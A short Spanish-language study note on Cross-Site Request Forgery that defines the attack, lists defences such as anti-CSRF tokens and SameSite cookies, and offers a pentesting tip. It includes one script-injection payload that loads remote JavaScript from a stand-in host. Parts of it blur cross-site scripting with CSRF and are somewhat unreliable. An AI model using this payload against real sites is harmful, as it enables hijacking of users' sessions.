## 🔓 Cross-Site Request Forgery (CSRF) 

### 📚 ¿Qué es CSRF?

**Cross-Site Request Forgery (CSRF)** es una vulnerabilidad que permite a un atacante realizar acciones no autorizadas en una aplicación web usando la sesión de un usuario autenticado.

➡️ El atacante engaña al navegador de la víctima para que ejecute solicitudes maliciosas **sin su consentimiento**.

---

### 🛠️ ¿Cómo funciona un ataque CSRF?

- La víctima está autenticada en la aplicación web.
    
- El atacante envía un enlace o carga un script malicioso.
    
- El navegador de la víctima, **sin saberlo**, envía una solicitud legítima con su **cookie de sesión**.
    

> Ejemplo clásico: cambiar la contraseña de la víctima a una controlada por el atacante.

---

### 🧩 Ejemplo de Payload

Carga un archivo JavaScript remoto que ejecuta acciones como cambiar la contraseña:

```html
"><script src=//www.example.com/exploit.js></script>
```

---

### 🛡️ Prevención de CSRF

|Técnica|Descripción|
|---|---|
|**Sanitización**|Remover caracteres especiales o no estándar del input de usuario.|
|**Validación**|Verificar que el input de usuario siga el formato esperado (e.g., emails válidos).|
|**Tokens anti-CSRF**|Generar un token único por sesión/solicitud y verificarlo.|
|**SameSite Cookie Attribute**|Configurar cookies con `SameSite=Strict` o `SameSite=Lax` para limitar solicitudes cross-origin.|
|**Autenticación Reforzada**|Pedir reingreso de contraseña para cambios sensibles (e.g., cambiar password).|

---

### 🧠 Notas Importantes

- **Front-end y Back-end** deben realizar validación y sanitización de inputs.
    
- **Modern Web Browsers** ayudan bloqueando ejecución automática de JavaScript.
    
- **WAF** (Web Application Firewall) puede mitigar intentos, pero **no es infalible**.
    
- La seguridad **debe estar en el diseño de la app**, no solo confiar en protecciones externas.
    

---

### ⚡ Tip de Pentesting

¿La aplicación NO pide un token único para acciones sensibles? 🚩 **Es muy probable que sea vulnerable a CSRF**.
